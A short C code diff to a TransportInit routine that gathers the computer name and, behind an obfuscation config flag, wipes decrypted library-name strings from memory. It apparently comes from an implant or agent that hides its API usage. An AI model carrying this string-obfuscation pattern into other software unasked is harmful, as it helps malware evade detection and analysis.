@@ -176,6 +176,7 @@ BOOL TransportInit( ) {
     FreeLibrary(p_iphlpapi);
 
 #else
+
     // Get Computer name
     if ( ! GetComputerNameExA(ComputerNameNetBIOS, NULL, (LPDWORD) &Length) ) {
         if ( ( Data = LocalAlloc( LPTR, Length ) ) )
@@ -263,11 +264,12 @@ BOOL TransportInit( ) {
         }
     }
 
+#if CONFIG_OBFUSCATION == TRUE
     // zero out decrypted strings
     mem_set(d_kernel32,0x0,strlen(d_kernel32));
     mem_set(d_advapi32,0x0,strlen(d_advapi32));
     mem_set(d_iphlpapi,0x0,strlen(d_iphlpapi));
-
+#endif
     return Success;
 }
 
